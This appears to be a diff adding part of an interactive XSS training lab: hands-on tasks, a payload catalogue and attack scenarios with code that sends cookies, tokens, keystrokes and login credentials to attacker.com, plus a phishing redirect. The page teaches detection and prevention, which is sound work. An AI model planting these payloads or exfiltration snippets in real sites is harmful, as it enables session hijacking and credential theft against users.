+      <div class="lab-task-hint">This URL parameter is read by JavaScript and written to the DOM with innerHTML. Enter a payload that exploits this.</div>
+      <div style="margin-top: 12px;">
+        <div class="input-label">URL HASH PARAMETER (#name=...):</div>
+        <input type="text" id="t4input" placeholder="Enter value for #name= parameter" style="margin-bottom: 8px;">
+        <div class="sim-browser" style="margin-bottom: 8px;">
+          <div class="sim-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><div class="sim-url" id="t4url">site.com/#name=...</div></div>
+          <div class="sim-content">Welcome, <span id="t4domOutput" style="color: var(--text2);">Guest</span></div>
+        </div>
+        <button class="btn btn-danger" onclick="submitTask4()">Load URL</button>
+        <div id="t4result" style="margin-top: 8px; font-family: var(--mono); font-size: 12px;"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- TASK 5 -->
+  <div class="lab-task" id="task5">
+    <div class="lab-task-num" id="t5num">05</div>
+    <div class="lab-task-body">
+      <div class="lab-task-title">Explain Why the Payload Worked</div>
+      <div class="lab-task-hint">Understanding is more important than execution. Explain in your own words why XSS works at a browser level.</div>
+      <div style="margin-top: 12px;">
+        <div class="input-label">YOUR EXPLANATION:</div>
+        <textarea id="t5input" placeholder="Explain: Why does the browser execute injected scripts? What is the fundamental trust issue?" style="height: 80px; margin-bottom: 8px;"></textarea>
+        <button class="btn btn-primary" onclick="submitTask5()">Submit Explanation</button>
+        <div id="t5result" style="margin-top: 8px; font-family: var(--mono); font-size: 12px;"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- COMPLETION -->
+  <div id="labComplete" style="display: none;" class="card card-accent" style="text-align:center; margin-top: 30px;">
+    <div style="font-size: 40px; margin-bottom: 16px;">🎓</div>
+    <div style="font-size: 22px; font-weight: 800; color: var(--accent); margin-bottom: 8px;">Lab Complete!</div>
+    <div style="color: var(--text2); margin-bottom: 16px;">You've completed all 5 tasks and demonstrated understanding of XSS from injection to prevention.</div>
+    <div class="grid3" style="margin-top: 20px;">
+      <div style="padding: 12px; background: var(--bg4); border-radius: 8px; text-align: center;">
+        <div style="font-family: var(--mono); font-size: 20px; color: var(--accent); font-weight: 700;">5/5</div>
+        <div style="font-size: 12px; color: var(--text3);">Tasks Done</div>
+      </div>
+      <div style="padding: 12px; background: var(--bg4); border-radius: 8px; text-align: center;">
+        <div style="font-family: var(--mono); font-size: 20px; color: var(--accent); font-weight: 700;">3</div>
+        <div style="font-size: 12px; color: var(--text3);">XSS Types Tested</div>
+      </div>
+      <div style="padding: 12px; background: var(--bg4); border-radius: 8px; text-align: center;">
+        <div style="font-family: var(--mono); font-size: 20px; color: var(--accent); font-weight: 700;">100%</div>
+        <div style="font-size: 12px; color: var(--text3);">Score</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="nav-buttons">
+    <button class="btn" onclick="prevSection(10)">← Prevention</button>
+    <button class="btn" onclick="goHome()">↩ Back to Home</button>
+  </div>
+</div>
+
+<script>
+const SECTIONS = 10;
+let currentSection = 0;
+let completedSections = new Set();
+let labTasksDone = new Set();
+let selectedPayloadIdx = 0;
+let currentScenario = null;
+
+const payloads = [
+  {
+    title: 'SCRIPT TAG',
+    code: "<script>alert(1)<\/script>",
+    desc: "The most basic XSS payload. The browser sees the <script> tag and immediately executes the JavaScript inside it.",
+    how: ["1. Attacker injects &lt;script&gt; into input","2. Server reflects without encoding","3. Browser parses HTML, finds script tag","4. JavaScript executes in page context"],
+    msg: 'Script Tag XSS — alert(1) fired!'
+  },
+  {
+    title: 'IMG onerror',
+    code: '<img src=x onerror=alert(1)>',
+    desc: "An image with a broken src. When the image fails to load, the onerror event fires JavaScript. Bypasses script-tag filters.",
+    how: ["1. Browser tries to load image from 'x'","2. Load fails — onerror event fires","3. JavaScript in onerror attribute executes","4. Works even when &lt;script&gt; is filtered"],
+    msg: 'IMG onerror XSS — image load failed, onerror fired!'
+  },
+  {
+    title: 'onmouseover EVENT',
+    code: '<div onmouseover=alert(1)>Hover me</div>',
+    desc: "An event handler attribute. When the user hovers over the element, the JavaScript runs. User interaction triggers it.",
+    how: ["1. Inject element with event handler","2. Element appears in page","3. User interacts with element","4. Event handler JavaScript executes"],
+    msg: 'onmouseover XSS — hover triggered the payload!'
+  },
+  {
+    title: 'SVG PAYLOAD',
+    code: '<svg onload=alert(1)></svg>',
+    desc: "SVG elements support JavaScript events. The onload handler fires as soon as the SVG is rendered — no user interaction needed.",
+    how: ["1. SVG element injected into page","2. Browser renders SVG as part of DOM","3. onload event fires automatically","4. JavaScript executes immediately"],
+    msg: 'SVG onload XSS — fires on page load!'
+  },
+  {
+    title: 'COOKIE THEFT',
+    code: "<script>alert('Cookies: ' + document.cookie)<\/script>",
+    desc: "Reads and exposes the victim's cookies. In a real attack, this would be sent to the attacker's server to steal session tokens.",
+    how: ["1. Script injects via XSS","2. document.cookie returns all cookies","3. Data sent to attacker's server","4. Attacker uses cookie to log in as victim"],
+    msg: 'Cookie Theft XSS — document.cookie accessed!'
+  },
+  {
+    title: 'IFRAME INJECTION',
+    code: '<iframe src="javascript:alert(1)">',
+    desc: "Embeds an iframe with a javascript: URL. Old browsers execute the JavaScript in the src attribute directly.",
+    how: ["1. iframe with javascript: URL injected","2. Browser processes src attribute","3. javascript: protocol triggers execution","4. Script runs in page context"],
+    msg: 'iFrame injection XSS — javascript: protocol executed!'
+  }
+];
+
+const scenarios = {
+  cookie: {
+    title: 'COOKIE THEFT',
+    desc: '<p style="font-size:14px;color:var(--text2);margin-bottom:12px;">The attacker injects a script that reads <code>document.cookie</code> and sends it to their server. The session token is then used to impersonate the victim.</p>',
+    code: `<span class="t-comment">// Malicious script injected via XSS</span>\n<span class="t-key">var</span> stolen = <span class="t-danger">document.cookie</span>;\n<span class="t-key">new</span> Image().src = <span class="t-str">'http://attacker.com/steal?c='</span> + stolen;\n<span class="t-comment">// Victim's cookies silently sent to attacker</span>`,
+    impact: `<div class="card-title red">IMPACT</div><ul class="checklist" style="font-size:13px;"><li>Session token stolen</li><li>Attacker logs in as victim</li><li>No password needed</li><li>Works silently — victim unaware</li></ul>`,
+    sim: () => { simulateAlert('Cookie Theft Simulation!\n\nStolen data:\ndocument.cookie = "session=abc123; user=alice; pref=dark"\n\nIn a real attack, this is silently sent to attacker.'); }
+  },
+  session: {
+    title: 'SESSION HIJACKING',
+    desc: '<p style="font-size:14px;color:var(--text2);margin-bottom:12px;">After stealing the session cookie, the attacker sets it in their own browser. The server thinks it\'s the legitimate user.</p>',
+    code: `<span class="t-comment">// Step 1: Steal token</span>\n<span class="t-key">var</span> token = localStorage.<span class="t-danger">getItem</span>(<span class="t-str">'auth_token'</span>);\n<span class="t-comment">// Step 2: Exfiltrate</span>\nfetch(<span class="t-str">'http://attacker.com/?t='</span>+token);`,
+    impact: `<div class="card-title amber">IMPACT</div><ul class="checklist" style="font-size:13px;"><li>Full account access</li><li>Can change email/password</li><li>Make purchases as victim</li><li>Access private data</li></ul>`,
+    sim: () => { simulateAlert('Session Hijack Simulation!\n\nAuth token stolen from localStorage:\ntoken = "eyJhbGciOiJIUzI1NiJ9.abc..."\n\nAttacker now has full account access.'); }
+  },
+  phishing: {
+    title: 'FAKE LOGIN FORM',
+    desc: '<p style="font-size:14px;color:var(--text2);margin-bottom:12px;">XSS injects a fake login form over the real page. The URL still shows the legitimate site, so the victim trusts it and enters credentials.</p>',
+    code: `<span class="t-comment">// Replace page content with fake form</span>\ndocument.<span class="t-danger">body.innerHTML</span> = \`\n  &lt;h2&gt;Session expired. Login again.&lt;/h2&gt;\n  &lt;form action='http://attacker.com/steal'&gt;\n    &lt;input name='user'&gt;&lt;input name='pass'&gt;\n  &lt;/form&gt;\n\`;`,
+    impact: `<div class="card-title red">IMPACT</div><ul class="checklist" style="font-size:13px;"><li>Username + password stolen</li><li>Trusted URL — victim doesn't notice</li><li>Works on legitimate domains</li><li>Bypasses phishing detection</li></ul>`,
+    sim: () => { simulateAlert('Fake Login Form Simulation!\n\nPage content replaced with fake login.\nVictim sees: "Session expired — please login again"\nBut the form submits to attacker.com!\n\nCredentials would be stolen.'); }
+  },
+  defacement: {
+    title: 'PAGE DEFACEMENT',
+    desc: '<p style="font-size:14px;color:var(--text2);margin-bottom:12px;">The attacker replaces the entire page content with their own message. Often used for vandalism or propaganda. Causes reputational damage.</p>',
+    code: `<span class="t-comment">// Replace entire page</span>\ndocument.body.<span class="t-danger">innerHTML</span> = <span class="t-str">'&lt;h1&gt;HACKED&lt;/h1&gt;'</span>;\ndocument.title = <span class="t-str">'Hacked by XSS'</span>;\ndocument.body.style.background = <span class="t-str">'black'</span>;`,
+    impact: `<div class="card-title amber">IMPACT</div><ul class="checklist" style="font-size:13px;"><li>Reputation damage</li><li>User trust destroyed</li><li>Content replaced</li><li>Visible to all users</li></ul>`,
+    sim: () => { simulateAlert('Defacement Simulation!\n\nIn a real attack:\ndocument.body.innerHTML = "<h1>HACKED!</h1>"\n\nThe entire page would be replaced with attacker content.'); }
+  },
+  keylogger: {
+    title: 'KEYLOGGER',
+    desc: '<p style="font-size:14px;color:var(--text2);margin-bottom:12px;">JavaScript captures every keystroke. Passwords typed into forms on the page are silently sent to the attacker — even on HTTPS sites.</p>',
+    code: `<span class="t-comment">// Silent keylogger</span>\ndocument.addEventListener(<span class="t-str">'keypress'</span>, <span class="t-key">function</span>(e) {\n  <span class="t-key">var</span> key = String.fromCharCode(e.which);\n  fetch(<span class="t-str">'http://attacker.com/log?k='</span>+key);\n  <span class="t-comment">// Every keystroke exfiltrated</span>\n});`,
+    impact: `<div class="card-title red">IMPACT</div><ul class="checklist" style="font-size:13px;"><li>Every keystroke captured</li><li>Passwords stolen in real-time</li><li>Works on HTTPS</li><li>Completely silent</li></ul>`,
+    sim: () => { simulateAlert('Keylogger Simulation!\n\nScript now monitoring keystrokes...\nIf you typed a password, it would be silently sent to attacker.com.\n\nThis works even on HTTPS pages!'); }
+  },
+  redirect: {
+    title: 'MALICIOUS REDIRECT',
+    desc: '<p style="font-size:14px;color:var(--text2);margin-bottom:12px;">JavaScript redirects the victim to a phishing site. Victims think they clicked a link on a trusted site. Combined with spoofed login pages, this is very effective.</p>',
+    code: `<span class="t-comment">// Redirect to phishing site</span>\nwindow.location.href = <span class="t-str">'http://evil-phishing.com/login'</span>;\n<span class="t-comment">// Victim lands on fake site</span>\n<span class="t-comment">// URL changes — but victim was on trusted site first</span>`,
+    impact: `<div class="card-title accent">IMPACT</div><ul class="checklist" style="font-size:13px;"><li>User redirected to phishing site</li><li>Combined with fake login = credential theft</li><li>User thinks they navigated from trusted site</li><li>Hard to detect</li></ul>`,
+    sim: () => { simulateAlert('Redirect Simulation!\n\nwindow.location = "http://evil-phishing.com"\n\nIn a real attack, victim would be redirected.\nWe blocked this for safety — but it shows the capability.'); }
+  }
+};
+
+// Build nav steps
+function buildNav() {
+  const ns = document.getElementById('navSteps');
+  ns.innerHTML = '';
+  for (let i = 1; i <= SECTIONS; i++) {
+    const d = document.createElement('div');
+    d.className = 'nav-step' + (completedSections.has(i) ? ' done' : '') + (currentSection === i ? ' active' : '');
+    d.textContent = i;
+    d.onclick = () => goToSection(i);
+    ns.appendChild(d);
+  }
+}
+
+function startLab() { goToSection(1); }
+
+function goHome() {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.getElementById('heroSection').style.display = 'block';
+  currentSection = 0;
+  buildNav();
+  window.scrollTo(0, 0);
+}
+
+function goToSection(n) {
+  document.getElementById('heroSection').style.display = 'none';
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.getElementById('section-' + n).classList.add('active');
+  currentSection = n;
+  buildNav();
+  window.scrollTo(0, 0);
+}
+
+function nextSection(n) {
+  completedSections.add(n);
+  if (n < SECTIONS) goToSection(n + 1);
+  buildNav();
+}
+
+function prevSection(n) {
+  if (n > 1) goToSection(n - 1);
+  else goHome();
+}
+
+// Alert simulation
+function simulateAlert(msg) {
+  document.getElementById('alertModalMsg').textContent = msg;
+  document.getElementById('alertModal').classList.add('show');
+}
+function closeAlert() { document.getElementById('alertModal').classList.remove('show'); }
+
+// SECTION 1 demos
+function demonstrateJS(type) {
+  const out = document.getElementById('js-demo-output');
+  const content = document.getElementById('js-demo-content');
+  out.style.display = 'block';
+  const outputs = {
+    cookie: `<div class="t-key">> document.cookie</div><div class="t-val">"session=a1b2c3d4; user=alice; theme=dark"</div><div class="t-comment" style="margin-top:6px;">// JavaScript can read ALL cookies on this domain</div>`,
+    url: `<div class="t-key">> window.location.href</div><div class="t-val">"https://xss-lab.example.com/learn"</div><div class="t-key" style="margin-top:4px;">> window.location.search</div><div class="t-val">"?module=javascript"</div>`,
+    dom: `<div class="t-key">> document.title = "Hacked!"</div><div class="t-val">"Hacked!"</div><div class="t-key" style="margin-top:4px;">> document.body.style.background = "red"</div><div class="t-comment">// DOM fully accessible — page content can be changed</div>`
+  };
+  content.innerHTML = outputs[type];
+}
+
+// S4 tabs
+function s4tab(n) {
+  document.querySelectorAll('#s4tabs .tab').forEach((t,i) => t.classList.toggle('active', i===n));
+  document.querySelectorAll('#s4p0, #s4p1, #s4p2').forEach((p,i) => p.classList.toggle('active', i===n));
+}
+function s4render() {
+  const v = document.getElementById('s4input').value;
+  document.getElementById('s4renderResult').style.display = 'block';
+  document.getElementById('s4srcContent').textContent = `<div>${v}</div>`;
+  const preview = document.getElementById('s4preview');
+  const analysis = document.getElementById('s4analysis');
+  const hasScript = /<script/i.test(v);
+  const hasEvent = /on\w+=/i.test(v);
+  const hasTag = /<\w/i.test(v);
+  if (hasScript || hasEvent) {
+    preview.style.color = 'var(--red)';
+    preview.textContent = v + ' ⚠ Script detected — would execute!';
+    analysis.innerHTML = `<div class="badge badge-red">VULNERABLE</div> <span style="font-size:13px;color:var(--red);margin-left:8px;">Script/event handler detected — this would execute in a real browser</span>`;
+    simulateAlert('XSS Detected!\n\nYour payload: ' + v + '\n\nIn a real vulnerable site, this would execute.');
+  } else if (hasTag) {
+    preview.innerHTML = v;
+    analysis.innerHTML = `<div class="badge badge-amber">POTENTIAL XSS</div> <span style="font-size:13px;color:var(--amber);margin-left:8px;">HTML tags rendered — if scripts added, they would execute</span>`;
+  } else {
+    preview.textContent = v;
+    preview.style.color = 'var(--green)';
+    analysis.innerHTML = `<div class="badge badge-green">SAFE INPUT</div> <span style="font-size:13px;color:var(--green);margin-left:8px;">Plain text — no HTML injection detected</span>`;
+  }
+}
+
+// S5 tabs
+function s5tab(n) {
+  document.querySelectorAll('#s5tabs .tab').forEach((t,i) => t.classList.toggle('active', i===n));
+  document.querySelectorAll('#s5p0, #s5p1, #s5p2').forEach((p,i) => p.classList.toggle('active', i===n));
+}
+function runReflected() {
+  const v = document.getElementById('reflectedInput').value;
+  document.getElementById('reflectedUrl').textContent = 'example.com/search?q=' + encodeURIComponent(v).substring(0, 30) + '...';
+  const out = document.getElementById('reflectedOutput');
+  const hasScript = /<script/i.test(v) || /on\w+=/i.test(v);
+  if (hasScript) {
+    out.style.color = 'var(--red)';
+    out.textContent = v + ' ← EXECUTING!';
+    simulateAlert('Reflected XSS!\n\nPayload from URL parameter executed:\n' + v);
+  } else {
+    out.style.color = 'var(--amber)';
+    out.textContent = v;
+  }
+}
+function clearReflected() {
+  document.getElementById('reflectedInput').value = "<script>alert('Reflected XSS')<\/script>";
+  document.getElementById('reflectedOutput').textContent = "<script>alert('Reflected XSS')<\/script>";
+  document.getElementById('reflectedOutput').style.color = 'var(--amber)';
+  document.getElementById('reflectedUrl').textContent = 'example.com/search?q=...';
+}
+function postStoredXSS() {
+  const v = document.getElementById('storedInput').value.trim();
+  if (!v) return;
+  const c = document.getElementById('storedComments');
+  const div = document.createElement('div');
+  div.className = 'comment-item';
+  const hasScript = /<script/i.test(v) || /on\w+=/i.test(v) || /<img/i.test(v);
+  if (hasScript) {
+    div.innerHTML = `<div class="comment-author" style="color:var(--red);">attacker · just now <span class="badge badge-red">MALICIOUS</span></div><div style="color:var(--red);font-family:var(--mono);font-size:12px;">${escapeHtml(v)} ← stored in DB, executes for ALL visitors</div>`;
+    simulateAlert('Stored XSS!\n\nMalicious comment saved to database.\nEvery user who views this page will have this script execute.\n\nPayload: ' + v);
+  } else {
+    div.innerHTML = `<div class="comment-author">you · just now</div><div>${escapeHtml(v)}</div>`;
+  }
+  c.appendChild(div);
+  document.getElementById('storedInput').value = '';
+}
+function runDomXSS() {
+  const v = document.getElementById('domInput').value;
+  document.getElementById('domUrl').textContent = 'example.com/#' + v.substring(0,20) + '...';
+  const out = document.getElementById('domOutput');
+  const hasScript = /<script/i.test(v) || /on\w+=/i.test(v) || /onerror/i.test(v);
+  if (hasScript) {
+    out.style.color = 'var(--red)';
+    out.textContent = v + ' ← DOM INJECTION EXECUTING!';
+    simulateAlert('DOM-based XSS!\n\nURL parameter written directly to DOM with innerHTML:\n' + v + '\n\nServer never touched this — pure client-side attack!');
+  }
+}
+
+// S6 payloads
+function selectPayload(i) {
+  selectedPayloadIdx = i;
+  document.querySelectorAll('[id^="pc"]').forEach((c,idx) => {
+    c.style.borderColor = idx === i ? 'var(--red)' : 'var(--border)';
+  });
+  const p = payloads[i];
+  document.getElementById('pDetailTitle').textContent = p.title;
+  document.getElementById('pDetailCode').textContent = p.code;
+  document.getElementById('pDetailDesc').textContent = p.desc;
+  document.getElementById('pDetailHow').innerHTML = p.how.map(h => `<div style="margin-bottom:6px;">${h}</div>`).join('');
+}
+function execSelectedPayload() {
+  simulateAlert(payloads[selectedPayloadIdx].msg + '\n\n' + payloads[selectedPayloadIdx].code);
+}
+
+// S7 scenarios
+function showScenario(key) {
+  currentScenario = key;
+  const s = scenarios[key];
+  document.getElementById('scenarioDetail').style.display = 'block';
+  document.getElementById('scenTitle').textContent = s.title;
+  document.getElementById('scenDesc').innerHTML = s.desc;
+  document.getElementById('scenCode').innerHTML = s.code;
+  document.getElementById('scenImpact').innerHTML = s.impact;
+  document.getElementById('scenOutput').style.display = 'none';
+  document.getElementById('scenarioDetail').scrollIntoView({behavior: 'smooth'});
+}
+function execScenario() {
+  if (currentScenario && scenarios[currentScenario]) {
+    scenarios[currentScenario].sim();
+  }
+}
+
+// S8 scanner
+function runScan() {
+  const v = document.getElementById('scanInput').value;
+  const res = document.getElementById('scanResult');
+  const lines = document.getElementById('scanLines');
+  res.style.display = 'block';
+  const hasScript = /<script/i.test(v);
+  const hasEvent = /on\w+=/i.test(v);
+  const hasImg = /<img/i.test(v);
+  const hasSvg = /<svg/i.test(v);
+  const hasJs = /javascript:/i.test(v);
+  const results = [];
+  if (hasScript) results.push({t: 'vuln', msg: 'Script tag detected → HTML body injection possible'});
+  if (hasEvent) results.push({t: 'vuln', msg: 'Event handler detected → attribute injection possible'});
+  if (hasImg) results.push({t: 'vuln', msg: 'IMG tag detected → onerror/onload injection vector'});
+  if (hasSvg) results.push({t: 'vuln', msg: 'SVG element detected → onload injection possible'});
+  if (hasJs) results.push({t: 'vuln', msg: 'javascript: protocol detected → URL injection possible'});
+  if (results.length === 0) results.push({t: 'safe', msg: 'No obvious XSS patterns detected in this payload'});
+  results.push({t: 'info', msg: 'Injection points to test: URL params, comment fields, search boxes, profile fields'});
+  setTimeout(() => {
+    lines.innerHTML = results.map(r => `<div class="scan-line"><span class="${r.t === 'vuln' ? 'scan-vuln' : r.t === 'safe' ? 'scan-safe' : 'scan-info'}">[${r.t === 'vuln' ? 'VULN' : r.t === 'safe' ? 'SAFE' : 'INFO'}]</span> <span style="color:var(--text2);">${r.msg}</span></div>`).join('');
+    if (results.some(r => r.t === 'vuln')) {
+      lines.innerHTML += `<div class="scan-line" style="margin-top:6px;"><span class="scan-vuln">[RESULT]</span> <span style="color:var(--red);">XSS VULNERABILITY DETECTED — encoding required</span></div>`;
+    }
+  }, 400);
+}
+
+// S9 prevention
+function runPrevComparison() {
+  const v = document.getElementById('prevInput').value;
+  const inner = document.getElementById('innerHtmlDemo');
+  const text = document.getElementById('textContentDemo');
+  inner.innerHTML = v;
+  text.textContent = v;
+  const hasScript = /<script/i.test(v) || /onerror/i.test(v) || /on\w+=/i.test(v);
+  if (hasScript) {
+    simulateAlert('innerHTML executed your payload!\n\nThis is exactly what happens in a vulnerable site.\n\nNotice textContent on the right shows it safely as plain text.');
+  }
+}
+
+// LAB TASKS
+function updateLabProgress() {
+  const n = labTasksDone.size;
+  document.getElementById('labProgress').style.width = (n/5*100) + '%';
+  document.getElementById('labProgressText').textContent = n + ' / 5 tasks completed';
+  if (n === 5) {
+    document.getElementById('labComplete').style.display = 'block';
+    document.getElementById('labComplete').scrollIntoView({behavior: 'smooth'});
+  }
+}
+function markTask(n) {
+  labTasksDone.add(n);
+  const t = document.getElementById('task'+n);
+  t.classList.add('completed');
+  document.getElementById('t'+n+'num').textContent = '✓';
+  updateLabProgress();
+}
+
+function submitTask1() {
+  const v = document.getElementById('t1input').value;
+  const r = document.getElementById('t1result');
+  const hasScript = /<script/i.test(v) || /onerror/i.test(v) || /on\w+=/i.test(v);
+  if (hasScript) {
+    r.style.color = 'var(--green)';
+    r.textContent = '✓ Task 1 complete! Payload detected and executed.';
+    simulateAlert('Task 1: Alert Triggered!\n\nYour payload: ' + v + '\n\nThe browser executed your injected script!');
+    markTask(1);
+  } else {
+    r.style.color = 'var(--red)';
+    r.textContent = '✗ No XSS payload detected. Try: <script>alert(\'task1\')<\/script>';
+  }
+}
+function submitTask2() {
+  const v = document.getElementById('t2input').value;
+  const r = document.getElementById('t2result');
+  const reflect = document.getElementById('t2reflect');
+  const hasScript = /<script/i.test(v) || /onerror/i.test(v) || /on\w+=/i.test(v);
+  reflect.innerHTML = `<div style="font-family:var(--mono);font-size:12px;color:var(--text3);margin-top:4px;">Search results for: <span style="color:${hasScript?'var(--red)':'var(--green)'}">${escapeHtml(v)}</span></div>`;
+  if (hasScript && labTasksDone.has(1)) {
+    r.style.color = 'var(--green)';
+    r.textContent = '✓ Task 2 complete! Reflected XSS via search parameter!';
+    simulateAlert('Task 2: Reflected XSS!\n\nURL parameter reflected: ' + v + '\n\nThis would execute for anyone who visits the crafted URL.');
+    markTask(2);
+  } else if (!labTasksDone.has(1)) {
+    r.style.color = 'var(--amber)';
+    r.textContent = 'Complete Task 1 first!';
+  } else {
+    r.style.color = 'var(--red)';
+    r.textContent = '✗ Needs an XSS payload. Try an event handler like <img src=x onerror=alert(1)>';
+  }
+}
+function submitTask3() {
+  const v = document.getElementById('t3input').value;
+  const r = document.getElementById('t3result');
+  const hasScript = /<script/i.test(v) || /onerror/i.test(v) || /alert/i.test(v);
+  const c = document.getElementById('task3comments');
+  const div = document.createElement('div');
+  div.className = 'comment-item';
+  if (hasScript && labTasksDone.has(2)) {
+    div.innerHTML = `<div class="comment-author" style="color:var(--red);">you (attacker) · just now <span class="badge badge-red">MALICIOUS SCRIPT STORED</span></div><div style="color:var(--red);font-family:var(--mono);font-size:12px;">${escapeHtml(v)}</div>`;
+    c.appendChild(div);
+    r.style.color = 'var(--green)';
+    r.textContent = '✓ Task 3 complete! Malicious comment stored in database!';
+    simulateAlert('Task 3: Stored XSS!\n\nYour comment was stored.\nIn a real site, every visitor would trigger: ' + v);
+    markTask(3);
+    document.getElementById('t3input').value = '';
+  } else if (!labTasksDone.has(2)) {
+    r.style.color = 'var(--amber)';
+    r.textContent = 'Complete Task 2 first!';
+  } else {
+    div.innerHTML = `<div class="comment-author">you · just now</div><div>${escapeHtml(v)}</div>`;
+    c.appendChild(div);
+    r.style.color = 'var(--red)';
+    r.textContent = '✗ No XSS detected. Try: <script>alert(\'stored\')<\/script>';
+    document.getElementById('t3input').value = '';
+  }
+}
+function submitTask4() {
+  const v = document.getElementById('t4input').value;
+  const r = document.getElementById('t4result');
+  document.getElementById('t4url').textContent = 'site.com/#name=' + v.substring(0,20);
+  const out = document.getElementById('t4domOutput');
+  const hasScript = /<script/i.test(v) || /onerror/i.test(v) || /on\w+=/i.test(v) || /<img/i.test(v);
+  if (hasScript && labTasksDone.has(3)) {
+    out.style.color = 'var(--red)';
+    out.textContent = v + ' ← DOM XSS executing!';
+    r.style.color = 'var(--green)';
+    r.textContent = '✓ Task 4 complete! DOM-based XSS identified and exploited!';
+    simulateAlert('Task 4: DOM-based XSS!\n\nURL hash parameter written to DOM:\n' + v + '\n\nNo server involvement — pure client-side attack!');
+    markTask(4);
+  } else if (!labTasksDone.has(3)) {
+    r.style.color = 'var(--amber)';
+    r.textContent = 'Complete Task 3 first!';
+  } else {
+    out.style.color = 'var(--accent2)';
+    out.textContent = v || 'Guest';
+    r.style.color = 'var(--red)';
+    r.textContent = '✗ Use an XSS payload. Try: <img src=x onerror=alert(1)>';
+  }
+}
+function submitTask5() {
+  const v = document.getElementById('t5input').value.trim();
+  const r = document.getElementById('t5result');
+  const keywords = ['browser', 'trust', 'script', 'execute', 'input', 'html', 'code', 'inject'];
+  const matched = keywords.filter(k => v.toLowerCase().includes(k));
+  if (matched.length >= 3 && v.length > 50 && labTasksDone.has(4)) {
+    r.style.color = 'var(--green)';
+    r.textContent = '✓ Task 5 complete! Good explanation. Keywords used: ' + matched.join(', ');
+    markTask(5);
+  } else if (!labTasksDone.has(4)) {
+    r.style.color = 'var(--amber)';
+    r.textContent = 'Complete Task 4 first!';
+  } else if (v.length < 50) {
+    r.style.color = 'var(--amber)';
+    r.textContent = 'Please write a more detailed explanation (50+ characters).';
+  } else {
+    r.style.color = 'var(--amber)';
+    r.textContent = 'Include more key concepts: browser, trust, execute, inject, script, HTML. Matched: ' + (matched.join(', ') || 'none');
+  }
+}
+
+function escapeHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+// Init
+buildNav();
+selectPayload(0);
+</script>
+</body>
+</html>
